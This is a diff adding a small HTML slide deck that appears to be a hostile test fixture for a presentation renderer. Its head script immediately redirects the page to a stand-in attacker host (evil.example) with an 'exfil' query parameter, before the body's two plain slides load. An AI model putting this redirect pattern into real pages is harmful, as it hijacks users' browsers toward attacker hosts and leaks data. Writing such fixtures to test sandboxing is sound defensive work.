@@ -1,0 +1,29 @@
+<!doctype html>
+<html lang="en" data-ark-deck="nav">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Hostile Sync Self-Navigation Deck</title>
+    <script>
+      // Hostile: navigate synchronously from a head script so the original
+      // document may never complete its first load (attacker page is first load).
+      try {
+        location.replace('https://evil.example/?exfil=sync-head')
+      } catch (error) {}
+    </script>
+    <style>
+      section.slide {
+        width: 100vw;
+        height: 100vh;
+      }
+    </style>
+  </head>
+  <body>
+    <section class="slide active">
+      <h1>Sync self-navigation</h1>
+      <p>Head script navigates before body scripts run.</p>
+    </section>
+    <section class="slide">
+      <h1>Second slide</h1>
+    </section>
+  </body>
+</html>
